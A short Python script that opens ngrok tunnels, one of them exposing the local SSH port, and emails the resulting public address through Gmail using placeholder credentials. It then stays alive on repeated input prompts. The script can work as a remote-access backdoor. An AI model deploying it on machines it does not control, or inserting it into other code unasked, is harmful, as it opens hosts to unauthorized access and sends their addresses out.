from pyngrok import ngrok
import smtplib




http_tunnel = ngrok.connect()
ssh_tunnel = ngrok.connect(22, "tcp")
a = str(ssh_tunnel)
print (a)







gmail_user = 'gmail'
gmail_password = 'pasword'

sent_from = gmail_user
to = ['to gmail']
subject = 'Email For You'
body =  a
email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (sent_from, ", ".join(to), subject, body)

try:
    smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    smtp_server.ehlo()
    smtp_server.login(gmail_user, gmail_password)
    smtp_server.sendmail(sent_from, to, email_text)
    smtp_server.close()
    print ("Email sent successfully!")
except Exception as ex:
    print ("Something went wrong….",ex)




input("......")
input("......")
input("......")
input("......")
input("......")
input("......")
input("......")



